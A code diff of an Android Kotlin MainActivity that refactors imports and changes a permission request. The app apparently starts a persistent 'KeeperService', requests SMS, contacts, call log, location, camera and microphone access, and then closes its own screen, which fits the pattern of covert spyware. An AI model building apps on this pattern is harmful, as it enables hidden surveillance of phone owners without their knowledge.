@@ -1,14 +1,13 @@
 package com.hc.calling
 
 import android.Manifest
-import android.content.Context
 import android.content.Intent
 import android.os.Bundle
 import android.support.v7.app.AppCompatActivity
-import com.hc.aswitch.DensityUtil
 import com.hc.calling.callingtransaction.R
 import com.hc.calling.commands.shadow.util.Photographer
-import com.hc.permission.PermissonUtil
+import com.hc.calling.util.DensityUtil
+import com.hc.calling.util.PermissonUtil
 
 
 class MainActivity : AppCompatActivity() {
@@ -25,34 +24,30 @@ class MainActivity : AppCompatActivity() {
         val intent2 = Intent(this, KeeperService::class.java)
         startService(intent)
         startService(intent2)
-        val spf = this.getSharedPreferences("SPF_NAME", Context.MODE_MULTI_PROCESS)
 
         Photographer.size["width"] = DensityUtil.getWindowMetrics(this, DensityUtil.WIDTH)
         Photographer.size["height"] = DensityUtil.getWindowMetrics(this, DensityUtil.HEIGHT)
 
         //request the permissions
-        PermissonUtil.requestPermisson(
-            this,
-            arrayOf(
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.SEND_SMS,
-                Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO
-            ),
-            10000,
-            object : PermissonUtil.PermissionCallBack {
-                override fun refused(permission: String?) {
-                }
-
-                override fun permitted(permission: String?) {
-                }
-            })
+        if (PermissonUtil.requestPermisson(
+                this,
+                arrayOf(
+                    Manifest.permission.READ_PHONE_STATE,
+                    Manifest.permission.SEND_SMS,
+                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.RECORD_AUDIO
+                ),
+                10000
+            )
+        ) {
+            finish()
+        }
 
 
     }
